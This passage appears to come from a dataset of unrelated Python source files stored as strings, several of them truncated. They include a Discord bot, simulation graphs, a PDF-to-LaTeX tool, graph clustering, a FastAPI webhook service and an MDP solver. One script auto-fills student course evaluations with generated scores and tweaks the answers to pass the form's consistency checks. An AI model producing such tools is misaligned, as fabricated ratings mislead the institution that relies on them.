len(text) <= 2000:\n                await ctx.edit_original_response(text)\n            else:\n                # \u0420\u0430\u0437\u0431\u0438\u0432\u0430\u0435\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043d\u0430 \u0447\u0430\u0441\u0442\u0438\n                chunks = [text[i:i + 2000] for i in range(0, len(text), 2000)]\n                for chunk in chunks:\n                    await ctx.send(chunk)\n\n            await session.close()\n\n\n        except Exception as error:\n            await ctx.edit_original_response(f\"\u0423\u043f\u0441\u044c! \u0421\u0442\u0430\u043b\u0430\u0441\u044c \u043f\u043e\u043c\u0438\u043b\u043a\u0430! {error}\")\n            logger.error(traceback.format_exc())\n\n        is_busy = False\n\n\n    @staticmethod\n    async def httpRequest(url):\n        session = aiohttp.ClientSession()\n        resp = await session.get(url)\n        return resp, session\n\ndef setup(bot: commands.Bot):\n    bot.add_cog(TestAIModule())\n",
    "import numpy as np\r\nfrom utils import getUnit, dist_to_text, species_to_name, speciesToColor\r\nfrom jes_shapes import centerText, rightText, alignText, drawArrow, drawSpeciesCircle\r\nimport math\r\nimport pygame\r\nimport random\r\nimport bisect\r\n\r\ndef drawAllGraphs(sim, ui):\r\n    drawLineGraph(sim.percentiles, ui.graph, [70,0,30,30], sim.UNITS_PER_METER, ui.smallFont)\r\n    drawSAC(sim.species_pops, ui.sac, [70,0], ui)\r\n    drawGeneGraph(sim.species_info, sim.prominent_species, ui.gene_graph, sim, ui, ui.tinyFont)\r\n\r\ndef drawLineGraph(data,graph,margins,u,font):\r\n    BLACK = (0,0,0)\r\n    GRAY25 = (70,70,70)\r\n    GRAY50 = (128,128,128)\r\n    WHITE = (255,255,255)\r\n    RED = (255,0,0)\r\n\r\n    graph.fill(BLACK)\r\n    W = graph.get_width()-margins[0]-margins[1]\r\n    H = graph.get_height()-margins[2]-margins[3]\r\n    LEFT = margins[0]\r\n    RIGHT = graph.get_width()-margins[1]\r\n    BOTTOM = graph.get_height()-margins[3]\r\n    \r\n    minVal = np.amin(data)\r\n    maxVal = np.amax(data)\r\n    unit = getUnit((maxVal-minVal)/u)*u\r\n    tick = math.floor(minVal/unit)*unit-unit\r\n    while tick <= maxVal+unit:\r\n        ay = BOTTOM-H*(tick-minVal)/(maxVal-minVal)\r\n        pygame.draw.line(graph, GRAY25, (LEFT, ay), (RIGHT, ay), width=1)\r\n        rightText(graph, dist_to_text(tick, False, u), LEFT-7, ay, GRAY50, font)\r\n        tick += unit\r\n        \r\n    \r\n    toShow = [0,1,2,3,4,5,6,7,8,9,10,20,30,40,50,60,70,80,90,91,92,93,94,95,96,97,98,99,100]\r\n    LEN = len(data)\r\n    for g in range(LEN):\r\n        for p in toShow:\r\n            prevVal = 0 if g == 0 else data[g-1][p]\r\n            nextVal = data[g][p]\r\n            \r\n            x1 = LEFT+(g/LEN)*W\r\n            x2 = LEFT+((g+1)/LEN)*W\r\n            y1 = BOTTOM-H*(prevVal-minVal)/(maxVal-minVal)\r\n            y2 = BOTTOM-H*(nextVal-minVal)/(maxVal-minVal)\r\n            \r\n            IMPORTANT = (p%10 == 0)\r\n            thickness = 2 if IMPORTANT else 1\r\n            color = WHITE if IMPORTANT else GRAY50\r\n            if p == 50:\r\n                color = RED\r\n                thickness = 3\r\n            pygame.draw.line(graph, color, (x1, y1), (x2, y2), width=thickness)\r\n            \r\ndef drawSAC(data,sac,margins,ui):\r\n    sac.fill((0,0,0))\r\n    for g in range(len(data)):\r\n        scanDownTrapezoids(data, g, sac, margins, ui)\r\n        \r\ndef scanDownTrapezoids(data, g, sac, margins, ui):\r\n    W = sac.get_width()-margins[0]-margins[1]\r\n    H = sac.get_height()\r\n    LEN = len(data)\r\n    LEFT = margins[0]\r\n    RIGHT = sac.get_width()-margins[1]\r\n    x1 = LEFT+(g/LEN)*W\r\n    x2 = LEFT+((g+1)/LEN)*W\r\n    keys = sorted(list(data[g].keys()))\r\n    c_count = data[g][keys[-1]][2] # ending index of the last entry\r\n    FAC = H/c_count\r\n\r\n    if g == 0:\r\n        for sp in data[g].keys():\r\n            pop = data[g][sp]\r\n            points = [[x1,H/2],[x1,H/2],[x2,H-pop[1]*FAC],[x2,H-pop[2]*FAC]]\r\n            pygame.draw.polygon(sac,speciesToColor(sp, ui),points)\r\n    else:\r\n        trapezoidHelper(sac, data, g, g-1, 0, c_count, x1, x2, FAC, 0, ui)\r\n   \r\ndef getRangeEvenIfNone(dicty, key):\r\n    keys = sorted(list(dicty.keys()))\r\n    if key in keys:\r\n        return dicty[key]\r\n    else:\r\n        n = bisect.bisect(keys, key+0.5)\r\n        if n >= len(keys):\r\n            val = dicty[keys[n-1]][2]\r\n        else:\r\n            val = dicty[keys[n]][1]\r\n        return [0,val,val]\r\n\r\ndef trapezoidHelper(sac, data, g1, g2, i_start, i_end, x1, x2, FAC, level, ui):\r\n    pop2 = [0,0,0]\r\n    H = sac.get_height()\r\n    for sp in data[g1].keys():\r\n        pop1 = data[g1][sp]\r\n        if level == 0 and pop1[1] != pop2[2]: #there was a gap\r\n            trapezoidHelper(sac, data, g2, g1, pop2[2], pop1[1], x2, x1, FAC, 1, ui)\r\n        pop2 = getRangeEvenIfNone(data[g2],sp)\r\n        points = [[x1,H-pop2[1]*FAC],[x1,H-pop2[2]*FAC],[x2,H-pop1[2]*FAC],[x2,H-pop1[1]*FAC]]\r\n        pygame.draw.polygon(sac,speciesToColor(sp, ui),points)\r\n        \r\ndef drawGeneGraph(species_info, ps, gg, sim, ui, font):  # ps = prominent_species\r\n    R = ui.GENEALOGY_COOR[4]\r\n    H = gg.get_height()-R*2\r\n    W = gg.get_width()-R*2\r\n    gg.fill((0,0,0))\r\n    if len(sim.creatures) == 0:\r\n        return\r\n        \r\n    for level in range(len(ps)):\r\n        for i in range(len(ps[level])):\r\n            s = ps[level][i]\r\n            x = (i+0.5)/(len(ps[level]))*W+R\r\n            y = (level)/(len(ps)-0.8)*H+R\r\n            species_info[s].coor = (x,y)\r\n            \r\n    for level in range(len(ps)):\r\n        for i in range(len(ps[level])):\r\n            s = ps[level][i]\r\n            drawSpeciesCircle(gg,s,species_info[s].coor,R,sim,species_info,font,True,ui)\r\n        \r\ndef displayAllGraphs(screen, sim, ui):\r\n    WHITE = (255,255,255)\r\n    blitGraphsandMarks(screen, sim, ui)\r\n    blitGGandMarks(screen, sim, ui)\r\n    \r\n    if sim.last_gen_run_time >= 0:\r\n        rightText(screen, f\"Last gen runtime: {sim.last_gen_run_time:.3f}s\", 1200,28, WHITE, ui.smallFont)\r\n        \r\ndef blitGraphsandMarks(screen, sim, ui):\r\n    screen.blit(ui.graph,ui.GRAPH_COOR[0:2])\r\n    screen.bli",
    "import tkinter as tk\r\nfrom tkinter import filedialog, messagebox, ttk\r\nfrom pathlib import Path\r\nimport PyPDF2\r\nimport os\r\nimport fitz  \r\nimport re\r\nimport zipfile\r\nimport shutil\r\nfrom datetime import datetime\r\nimport docx  \r\nimport unicodedata\r\nfrom docx.shared import Pt\r\nfrom docx.oxml import OxmlElement\r\nfrom xml.etree import ElementTree\r\n\r\nclass PDFToLatexConverter:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"PDF to LaTeX Converter\")\r\n        self.root.geometry(\"600x350\")\r\n        self.root.resizable(False, False)\r\n        self.root.configure(bg='#f0f0f0')\r\n        \r\n        # Create main frame\r\n        main_frame = tk.Frame(root, bg='#f0f0f0', padx=20, pady=20)\r\n        main_frame.pack(expand=True, fill='both')\r\n        \r\n        # Title\r\n        title_label = tk.Label(\r\n            main_frame, \r\n            text=\"PDF to LaTeX Converter\",\r\n            font=(\"Arial\", 16, \"bold\"),\r\n            bg='#f0f0f0'\r\n        )\r\n        title_label.pack(pady=10)\r\n        \r\n        # File selection frame\r\n        file_frame = tk.LabelFrame(\r\n            main_frame,\r\n            text=\"File Selection\",\r\n            font=(\"Arial\", 10),\r\n            bg='#f0f0f0',\r\n            padx=10,\r\n            pady=10\r\n        )\r\n        file_frame.pack(fill='x', pady=10)\r\n        \r\n        self.selected_file = tk.StringVar()\r\n        tk.Entry(\r\n            file_frame,\r\n            textvariable=self.selected_file,\r\n            width=50,\r\n            font=(\"Arial\", 10)\r\n        ).pack(side='left', padx=5)\r\n        \r\n        browse_btn = tk.Button(\r\n            file_frame,\r\n            text=\"Browse\",\r\n            command=self.browse_file,\r\n            font=(\"Arial\", 10),\r\n            bg='#2196F3',\r\n            fg='white',\r\n            padx=10\r\n        )\r\n        browse_btn.pack(side='left')\r\n        \r\n        # Progress frame\r\n        progress_frame = tk.LabelFrame(\r\n            main_frame,\r\n            text=\"Conversion Progress\",\r\n            font=(\"Arial\", 10),\r\n            bg='#f0f0f0',\r\n            padx=10,\r\n            pady=10\r\n        )\r\n        progress_frame.pack(fill='x', pady=10)\r\n        \r\n        self.progress_var = tk.DoubleVar()\r\n        self.progress_label = tk.Label(\r\n            progress_frame,\r\n            text=\"0%\",\r\n            font=(\"Arial\", 10),\r\n            bg='#f0f0f0'\r\n        )\r\n        self.progress_label.pack()\r\n        \r\n        self.progress_bar = ttk.Progressbar(\r\n            progress_frame,\r\n            variable=self.progress_var,\r\n            maximum=100,\r\n            mode='determinate',\r\n            length=500\r\n        )\r\n        self.progress_bar.pack(pady=5)\r\n        \r\n        # Convert button\r\n        self.convert_btn = tk.Button(\r\n            main_frame,\r\n            text=\"Convert to LaTeX\",\r\n            command=self.convert_document,\r\n            font=(\"Arial\", 12, \"bold\"),\r\n            bg='#4CAF50',\r\n            fg='white',\r\n            padx=20,\r\n            pady=10\r\n        )\r\n        self.convert_btn.pack(pady=20)\r\n\r\n    def browse_file(self):\r\n        filename = filedialog.askopenfilename(\r\n            title=\"Select File\",\r\n            filetypes=[\r\n                (\"Supported files\", \"*.pdf;*.doc;*.docx\"),\r\n                (\"PDF files\", \"*.pdf\"),\r\n                (\"Word files\", \"*.doc;*.docx\"),\r\n            ]\r\n        )\r\n        if filename:\r\n            self.selected_file.set(filename)\r\n\r\n    def update_progress(self, current, total):\r\n        progress = (current / total) * 100\r\n        self.progress_var.set(progress)\r\n        self.progress_label.config(text=f\"{progress:.1f}%\")\r\n        self.root.update()\r\n\r\n    def extract_images(self, pdf_path, output_folder):\r\n        \"\"\"Tr\u00edch xu\u1ea5t h\u00ecnh \u1ea3nh t\u1eeb PDF\"\"\"\r\n        pdf_document = fitz.open(pdf_path)\r\n        images_info = []\r\n        \r\n        for page_number in range(pdf_document.page_count):\r\n            page = pdf_document[page_number]\r\n            image_list = page.get_images()\r\n            \r\n            for img_index, img in enumerate(image_list):\r\n                xref = img[0]\r\n                base_image = pdf_document.extract_image(xref)\r\n                image_ext = base_image[\"ext\"]\r\n                image_name = f\"image_p{page_number + 1}_{img_index + 1}.{image_ext}\"\r\n                image_path = os.path.join(output_folder, image_name)\r\n                \r\n                with open(image_path, \"wb\") as image_file:\r\n                    image_file.write(base_image[\"image\"])\r\n                \r\n                images_info.append({\r\n                    'path': image_name,\r\n                    'page': page_number\r\n                })\r\n        \r\n        return images_info\r\n\r\n    def extract_docx_images(self, doc, output_folder):\r\n        \"\"\"Tr\u00edch xu\u1ea5t h\u00ecnh \u1ea3nh t\u1eeb DOCX\"\"\"\r\n        images_info = []\r\n        for i, rel in enumerate(doc.part.rels.values()):\r\n            if \"image\" in rel.reltype:\r\n                image_data = rel.target_part.blob\r\n                image_ext = rel.target_ref.split('.')[-1]\r\n      ",
    "import networkx as nx\nimport html\nfrom typing import Any, Dict, List, Tuple, cast\nfrom graspologic.partition import hierarchical_leiden, HierarchicalClusters\n\ndef run_leiden(\n    G: nx.Graph, \n    max_cluster_size = 10,\n    use_lcc = True\n) -> Tuple[Dict[int, Dict[int, List[str]]], Dict[int, int]]:\n    node_id_to_community_map, community_hierarchy_map = compute_leiden_communities(\n        G,\n        max_cluster_size=max_cluster_size,\n        use_lcc=use_lcc\n    )\n    \n    levels = sorted(node_id_to_community_map.keys())\n    \n    results_by_level: Dict[int, Dict[int, List[str]]] = {}\n    for level in levels:\n        results: Dict[int, List[str]] = {}\n        results_by_level[level] = results\n        for node_id, community_id in node_id_to_community_map[level].items():\n            results[community_id] = results.get(community_id, [])\n            results[community_id].append(node_id)\n            \n    return results_by_level, community_hierarchy_map\n    \n\ndef compute_leiden_communities(\n    graph: nx.Graph,\n    max_cluster_size: int = 10,\n    use_lcc: bool = True,\n    seed=0xDEADBEEF,\n) -> Tuple[Dict[int, Dict[str, int]], Dict[int, int]]:\n    \n    if use_lcc:\n        graph = stable_largest_connected_component(graph)\n        \n    community_mapping: HierarchicalClusters = hierarchical_leiden(graph, max_cluster_size=max_cluster_size, random_seed=seed)\n    \n    results: Dict[int, Dict[str, int]] = {}\n    hierarchy: Dict[int, int] = {}\n    \n    for partition in community_mapping:\n        results[partition.level] = results.get(partition.level, {})\n        results[partition.level][partition.node] = partition.cluster\n        \n        hierarchy[partition.cluster] = (\n            partition.parent_cluster if partition.parent_cluster is not None else -1\n        )\n        \n    return results, hierarchy\n        \n        \n\ndef stable_largest_connected_component(graph: nx.Graph) -> nx.Graph:\n    \"\"\"Return the largest connected component of the graph, with nodes and edges sorted in a stable way.\"\"\"\n    # NOTE: The import is done here to reduce the initial import time of the module\n    from graspologic.utils import largest_connected_component\n\n    graph = graph.copy()\n    graph = cast(\"nx.Graph\", largest_connected_component(graph))\n    graph = normalize_node_names(graph)\n    return _stabilize_graph(graph)\n\n\ndef _stabilize_graph(graph: nx.Graph) -> nx.Graph:\n    \"\"\"Ensure an undirected graph with the same relationships will always be read the same way.\"\"\"\n    fixed_graph = nx.DiGraph() if graph.is_directed() else nx.Graph()\n\n    sorted_nodes = graph.nodes(data=True)\n    sorted_nodes = sorted(sorted_nodes, key=lambda x: x[0])\n\n    fixed_graph.add_nodes_from(sorted_nodes)\n    edges = list(graph.edges(data=True))\n\n    # If the graph is undirected, we create the edges in a stable way, so we get the same results\n    # for example:\n    # A -> B\n    # in graph theory is the same as\n    # B -> A\n    # in an undirected graph\n    # however, this can lead to downstream issues because sometimes\n    # consumers read graph.nodes() which ends up being [A, B] and sometimes it's [B, A]\n    # but they base some of their logic on the order of the nodes, so the order ends up being important\n    # so we sort the nodes in the edge in a stable way, so that we always get the same order\n    if not graph.is_directed():\n\n        def _sort_source_target(edge):\n            source, target, edge_data = edge\n            if source > target:\n                temp = source\n                source = target\n                target = temp\n            return source, target, edge_data\n\n        edges = [_sort_source_target(edge) for edge in edges]\n\n    def _get_edge_key(source: Any, target: Any) -> str:\n        return f\"{source} -> {target}\"\n\n    edges = sorted(edges, key=lambda x: _get_edge_key(x[0], x[1]))\n\n    fixed_graph.add_edges_from(edges)\n    return fixed_graph\n\n\ndef normalize_node_names(graph: nx.Graph | nx.DiGraph) -> nx.Graph | nx.DiGraph:\n    \"\"\"Normalize node names.\"\"\"\n    node_mapping = {node: node.strip() for node in graph.nodes()}  # type: ignore\n    return nx.relabel_nodes(graph, node_mapping)",
    "from fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nimport requests\n\napp = FastAPI()\n\n# In-memory database to store orders\norders = []\n\n# Registered webhook URLs\nwebhooks = []\n\nclass Order(BaseModel):\n    id: int\n    product_name: str\n    quantity: int\n    price: float\n\nclass WebhookURL(BaseModel):\n    url: str\n\n@app.post(\"/orders/\")\ndef create_order(order: Order):\n    orders.append(order)\n    # Notify registered webhooks\n    notify_webhooks(order)\n    return {\"message\": \"Order created successfully!\", \"order\": order}\n\n@app.get(\"/orders/\")\ndef list_orders():\n    return orders\n\n@app.post(\"/webhooks/\")\ndef register_webhook(webhook: WebhookURL):\n    if webhook.url in webhooks:\n        raise HTTPException(status_code=400, detail=\"Webhook URL already registered.\")\n    webhooks.append(webhook.url)\n    return {\"message\": \"Webhook registered successfully!\", \"webhook\": webhook}\n\n@app.get(\"/webhooks/\")\ndef list_webhooks():\n    return {\"webhooks\": webhooks}\n\ndef notify_webhooks(order: Order):\n    for webhook in webhooks:\n        try:\n            response = requests.post(webhook, json=order.dict(), timeout=5)\n            response.raise_for_status()\n        except Exception as e:\n            print(f\"Failed to notify webhook {webhook}: {e}\")",
    "\"\"\"\nThis file defines the weakly-coupled MDP with heterogenous arms,\nthe helper class for solving the LP relaxations,\nclasses for RB policies,\nalong with a few helper functions\n\"\"\"\n\nimport numpy as np\nimport cvxpy as cp\nimport scipy\nimport warnings\nimport functools\nimport operator\nimport logging\nlogging.basicConfig(level=logging.WARNING)\n\n\nclass SingleArmAnalyzer(object):\n    def __init__(self, sspa_size, aspa_size, N, type_fracs, trans_tensor, reward_tensor, K, cost_tensor_list, alpha_list):\n        self.sspa_size = sspa_size\n        self.sspa = np.array(list(range(self.sspa_size)), dtype=int)\n        self.aspa_size = aspa_size\n        self.aspa = np.array(list(range(self.aspa_size)), dtype=int)\n        self.sa_pairs = []\n        for s in self.sspa:\n            for a in self.aspa:\n                self.sa_pairs.append((s, a))\n        self.N = N\n        self.num_types = len(type_fracs)\n        self.type_fracs = type_fracs # fraction of arms of each type (true fraction, s.t. type_fracs[j]*N is integer)\n        self.trans_tensor = trans_tensor\n        self.reward_tensor = reward_tensor\n        self.K = K\n        self.cost_tensor_list = cost_tensor_list\n        self.alpha_list = alpha_list\n        # any numbers smaller than self.EPS are regard as zero\n        self.EPS = 1e-8\n        # check dimensions\n        assert self.N >= self.num_types\n        assert len(self.type_fracs.shape) == 1\n        assert self.trans_tensor.shape == (self.num_types, sspa_size, aspa_size, sspa_size)\n        assert self.reward_tensor.shape == (self.num_types, sspa_size, aspa_size)\n        for k in range(K):\n            assert self.cost_tensor_list[k].shape == (self.num_types, sspa_size, aspa_size)\n            assert (type(self.alpha_list[k]) == float) or (len(self.alpha_list[k].shape) == 0)\n\n        # two parameters used in reassignment\n        self.cmax = np.max(np.array(self.cost_tensor_list))\n        self.alphamin = np.min(np.array(alpha_list))\n\n        # variables\n        self.y = cp.Variable((self.num_types, self.sspa_size, self.aspa_size))\n        # self.dualvars = cp.Parameter((K,), name=\"dualvar\")  # the subsidy parameter for solving Whittle's index policy\n\n        self.opt_value = None\n\n        self.state_probs = None  # optimal state frequency for each arm, ndarray, dims=(N, sspa), dtype=float\n        self.policies = None  # optimal single-armed policies for each arm, ndarray, dims=(N, sspa, aspa), dtype=float\n        self.Ps = None # transition matrix under the optimal single-armed policy for each arm dims=(N, sspa, sspa), dtype=float\n\n    def get_stationary_constraints(self):\n        stationary_constrs = []\n        for j in range(self.num_types):\n            for cur_s in self.sspa:\n                mu_s = cp.sum(cp.multiply(self.y[j,:,:], self.trans_tensor[j,:,:,cur_s]))\n                stationary_constrs.append(mu_s == cp.sum(self.y[j, cur_s, :]))\n        return stationary_constrs\n\n    def get_budget_constraints(self):\n        budget_constrs = []\n        for k in range(self.K):\n            cost_tensor = self.cost_tensor_list[k]\n            alpha = self.alpha_list[k]\n            cost_vec = cp.sum(cp.multiply(self.y, cost_tensor), axis=(1,2))\n            budget_constrs.append(self.type_fracs @ cost_vec <= alpha)\n        return budget_constrs\n\n    def get_basic_constraints(self):\n        # the constraints that make sure we solve a probability distribution\n        basic_constrs = []\n        basic_constrs.append(self.y >= 0.1*self.EPS)\n        basic_constrs.append(cp.sum(self.y, axis=(1,2)) == 1)\n        return basic_constrs\n\n    def get_objective(self):\n        reward_vec = cp.sum(cp.multiply(self.y, self.reward_tensor), axis=(1,2))\n        objective = cp.Maximize(self.type_fracs @ reward_vec)\n        return objective\n\n    def solve_lp(self):\n        objective = self.get_objective()\n        constrs = self.get_stationary_constraints() + self.get_budget_constraints() + self.get_basic_constraints()\n        problem = cp.Problem(objective, constrs)\n        self.opt_value = problem.solve(verbose=False)\n        y = self.y.value\n        # to take account of imprecise solutions, make sure y[i,:,:] is non-negative and sums to 1\n        y = y * (y>=0)\n        y = y / np.sum(y, axis=(1,2), keepdims=True)\n        self.state_probs = np.sum(y, axis=2)\n        self.policies = np.zeros((self.num_types, self.sspa_size, self.aspa_size,))\n        for j in range(self.num_types):\n            for s in self.sspa:\n                if self.state_probs[j, s] > self.EPS:\n                    self.policies[j, s, :] = y[j, s, :] / self.state_probs[j, s]\n                else:\n                    self.policies[j, s, :] = 1 / self.aspa_size\n        self.Ps = np.zeros((self.num_types, self.sspa_size, self.sspa_size,))\n        for j in range(self.num_types):\n            for a in self.aspa:\n                self.Ps[j,:,:] += self.trans_tensor[j,:,a,:]*np.expand_dims(self.policies[j,:,a], axis=1)\n        return self.opt_value, y\n\n    def print_LP_solution(self, arm_",
    "'''\r\nRemember the rules:\r\n\r\nSnake   drinks  Water       and wins.\r\nWater   drowns  the Gun     and wins.\r\nGun     shoots  the Snake   and wins.\r\n\r\nSuppose: \r\n\r\n    Snake = 1, Water = 0, Gun = -1\r\n\r\n'''\r\nimport random\r\n\r\n'''\r\nyouChosed = input(\"Enter your choice: \")\r\nyouChosed = youChosed[0].lower() \r\nyourDict = {\"s\": 1, \"w\": 0, \"g\": -1}\r\nyou = yourDict[youChosed]\r\n\r\ncomputer = random.choice([1, 0, -1])\r\n\r\nif(you == computer):\r\n    print(\"Match Draw. \")\r\n\r\nelse:\r\n    if  (you == 1 and computer == 0):  # 1+0 = 1        # 1+(-0) = 1\r\n        print(\"You Win!\") # Win............................................\r\n\r\n    elif(you == 1 and computer == -1): # 1+-1 = 0       # 1+(-(-1) = 2\r\n        print(\"You Lose!\")\r\n\r\n    elif(you == 0 and computer == 1):  # 0+1 = 1        # 0+(-1) =-1\r\n        print(\"You Lose!\")\r\n\r\n    elif(you == 0 and computer == -1): # 0-1 = -1       # 0+(-(-1) = 1\r\n        print(\"You Win!\") # Win............................................\r\n\r\n    elif(you == -1 and computer == 0): # -1+0 = -1      # -1+(-0) = -1 \r\n        print(\"You Lose!\")\r\n\r\n    elif(you == -1 and computer == 1): # -1+1 = 0       # -1+(-1) = -2\r\n        print(\"You Win!\") # Win............................................\r\n        \r\n    else:\r\n        print(\"Something is wrong...\")\r\n\r\n# First approach will not work. (because 1,0,-1 all for win)\r\n# Secound approach will work. (because of only 1,-2 you can win)\r\n# So, now(The Most Small, Complex, Time-Efficient: approach): \r\n'''\r\nprint(\"\\n\")\r\nn = int(input(\"..:: The Total Point: \"))\r\nprint(\"\\n\")\r\n\r\ndraw = 0\r\nwin = 0\r\ncount = 0\r\nwhile (count != n):\r\n\r\n    yourInput = input(f\"{count+1}. Enter your choice (S for Snake, W for Water, G for Gun): \")\r\n    print(\"\\n\")\r\n    yourInput = yourInput[0].lower() \r\n\r\n    if yourInput in (\"s\", \"w\", \"g\"):\r\n        count += 1\r\n        yourDict = {\"s\": 1, \"w\": 0, \"g\": -1}\r\n        you = yourDict[yourInput]\r\n        optionsStr = {1: \"Snake\", 0: \"Water\", -1: \"Gun\"}\r\n        computer = random.choice([1, 0, -1])\r\n\r\n        print(f\"---> You Chose: {optionsStr[you]} AND The Computer Chose: {optionsStr[computer]}\\n\")\r\n\r\n\r\n        if(you == computer):\r\n            print(\"..:: Match Draw. \")\r\n            draw += 1\r\n        else:\r\n            if(you - computer == 1 or you - computer == -2):\r\n                print(\"..:: You Win!\") # Win............................................\r\n                win +=1\r\n            else:\r\n                print(\"..:: You Lose!\")\r\n\r\n        print(\"\\n\")\r\n        lose = n-(win+draw) # for wrong input win and draw will not be increased. So, without WIN and DRAW everything(errors & loses) will count as LOSE....\r\n\r\n\r\n    else:\r\n        print(\"Invalid input. Please choose S, W, or G.\")\r\n        print(\"\\n\")\r\n\r\nprint(f\"==> Total Win/(s): {win}, Lose/(s): {lose} and Draw/(s): {draw} in {n} Points...\")\r\nprint(\"\\n\")\r\n",
    "import random\nfrom dataclasses import dataclass\n\n@dataclass\nclass Option:\n    id: str\n    content: str\n    pts: float\n\n@dataclass\nclass Question:\n    isChoice: bool\n    type: str\n    id: str\n    options: list\n\ndef fill_form(form_info, method='good'):\n    basic_info = form_info['pjxtPjjgPjjgckb'][1]\n    question_list = get_question_list(form_info)\n    choice_list = [q for q in question_list if q.isChoice]\n    other_list = [q for q in question_list if not q.isChoice]\n    if method == 'good':\n        choice_answer = gen_good_answer(choice_list)\n    elif method == 'random':\n        choice_answer = gen_random_answer(choice_list)\n    elif method == 'worst_passing':\n        choice_answer = gen_worst_passing_answer(choice_list)\n    else:\n        raise ValueError(f\"\u672a\u77e5\u7684\u65b9\u6cd5 {method}\")\n    enforce_rules(choice_answer, choice_list)\n    total_score = int(sum(q.pts for q in choice_answer if q))\n    answer_list = []\n    for i in range(len(choice_list)):\n        if choice_answer[i]:\n            selected_id = choice_answer[i].id\n        else:\n            selected_id = \"\"\n        answer_list.append({\n            'sjly': '1',\n            'stlx': choice_list[i].type,\n            'wjid': basic_info['wjid'],\n            'wjssrwid': basic_info['wjssrwid'],\n            'wjstctid': \"\",\n            'wjstid': choice_list[i].id,\n            'xxdalist': [\n                selected_id\n            ]\n        })\n    for q in other_list:\n        answer_list.append({\n            'sjly': '1',\n            'stlx': q.type,\n            'wjid': basic_info['wjid'],\n            'wjssrwid': basic_info['wjssrwid'],\n            'wjstctid': q.options[0].id if q.options else \"\",\n            'wjstid': q.id,\n            'xxdalist': [\n                \"\"\n            ]\n        })\n    ret = {\n        'pjidlist': [],\n        'pjjglist': [\n            {\n                'bprdm': basic_info['bprdm'],\n                'bprmc': basic_info['bprmc'],\n                'kcdm': basic_info['kcdm'],\n                'kcmc': basic_info['kcmc'],\n                'pjdf': total_score,\n                'pjfs': basic_info['pjfs'],\n                'pjid': basic_info['pjid'],\n                'pjlx': basic_info['pjlx'],\n                'pjmap': form_info['pjmap'],\n                'pjrdm': basic_info['pjrdm'],\n                'pjrjsdm': basic_info['pjrjsdm'],\n                'pjrxm': basic_info['pjrxm'],\n                'pjsx': 1,\n                'rwh': basic_info['rwh'],\n                'stzjid': basic_info['stzjid'],\n                'wjid': basic_info['wjid'],\n                'wjssrwid': basic_info['wjssrwid'],\n                'wtjjy': '',\n                'xhgs': basic_info['xhgs'],\n                'xnxq': basic_info['xnxq'],\n                'sfxxpj': '1',\n                'sqzt': basic_info['sqzt'],\n                'yxfz': basic_info['yxfz'],\n                'sdrs': basic_info['sdrs'],\n                \"zsxz\": basic_info['pjrjsdm'],\n                'sfnm': '1',\n                'pjxxlist': answer_list\n            }\n        ],\n        'pjzt': '1'\n    }\n    return ret\n\ndef get_question_list(form_info):\n    ret = []\n    for entry in form_info['pjxtWjWjbReturnEntity']['wjzblist'][0]['tklist']:\n        q = Question(\n            isChoice=entry['tmlx'] == '1',\n            type=entry['tmlx'],\n            id=entry['tmid'],\n            options=[]\n        )\n        for option in entry.get('tmxxlist', []):\n            q.options.append(Option(\n                id=option['tmxxid'],\n                content=option['xxmc'],\n                pts=float(option['xxfz'])\n            ))\n        q.options.sort(key=lambda x: x.pts, reverse=True)\n        ret.append(q)\n    return ret\n\ndef gen_good_answer(choice_list):\n    ret = []\n    for q in choice_list:\n        ret.append(q.options[0] if q.options else None)\n    return ret\n\ndef gen_random_answer(choice_list):\n    ret = []\n    for q in choice_list:\n        if q.options:\n            selected_option = random.choice(q.options[:3]) if len(q.options) >=3 else random.choice(q.options)\n            ret.append(selected_option)\n        else:\n            ret.append(None)\n    return ret\n\ndef gen_worst_passing_answer(choice_list):\n    ret = []\n    for q in choice_list:\n        if q.options:\n            ret.append(q.options[2] if len(q.options) >=3 else q.options[-1])\n        else:\n            ret.append(None)\n    return ret\n\ndef enforce_rules(choice_answer, choice_list):\n    # \u89c4\u52191\uff1a\u4e0d\u80fd\u5168\u9009\u540c\u4e00\u4e2a\u9009\u9879\n    selected_contents = [option.content for option in choice_answer if option]\n    if len(set(selected_contents)) == 1:\n        for i, option in enumerate(choice_answer):\n            if option.content != '\u4e2d\u7b49':\n                for opt in choice_list[i].options:\n                    if opt.content != option.content:\n                        choice_answer[i] = opt\n                        break\n                break\n    # \u89c4\u52192\uff1a\u524d\u4e94\u9053\u9898\u4e2d\u81f3\u5c11\u6709\u4e00\u9053\u9009\u62e9\u201c\u5408\u683c\u4ee5\u4e0a\u201d\uff08\u4e2d\u7b49\u3001\u826f\u597d\u3001\u4f18\u79c0\uff09\n    count_passing = sum(1 for option in choice_answer[:5] if option and option.content in ['\u4e2d\u7b49', '\u826f\u597d', '\u4f18\u79c0'])\n    if count_passing == 0:\n        fo",
    "{\"nbformat\":4,\"nbformat_minor\":0,\"metadata\":{\"colab\":{\"provenance\":[],\"authorship_tag\":\"ABX9TyOfabzwdih4qZ/Hsm5q0+0z\"},\"kernelspec\":{\"name\":\"python3\",\"display_name\":\"Python 3\"},\"language_info\":{\"name\":\"python\"}},\"cells\":[{\"cell_type\":\"code\",\"execution_count\":7,\"metadata\":{\"colab\":{\"base_uri\":\"https://localhost:8080/\",\"height\":646},\"id\":\"oDyLQMa8RTFk\",\"executionInfo\":{\"status\":\"ok\",\"timestamp\":1735662399309,\"user_tz\":0,\"elapsed\":6462,\"user\":{\"displayName\":\"Ishmael Manne\",\"userId\":\"18186348154757738609\"}},\"outputId\":\"46e70167-a36e-4e6e-99bd-ab964731e8e1\"},\"outputs\":[{\"output_type\":\"stream\",\"name\":\"stderr\",\"text\":[\"WARNING:absl:Compiled the loaded model, but the compiled metrics have yet to be built. `model.compile_metrics` will be empty until you train or evaluate the model.\\n\"]},{\"output_type\":\"stream\",\"name\":\"stdout\",\"text\":[\"Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\\\"/content/drive\\\", force_remount=True).\\n\",\"Colab notebook detected. To show errors in colab notebook, set debug=True in launch()\\n\",\"* Running on public URL: https://0f5b3efaaf510764c2.gradio.live\\n\",\"\\n\",\"This share link expires in 72 hours. For free permanent hosting and GPU upgrades, run `gradio deploy` from the terminal in the working directory to deploy to Hugging Face Spaces 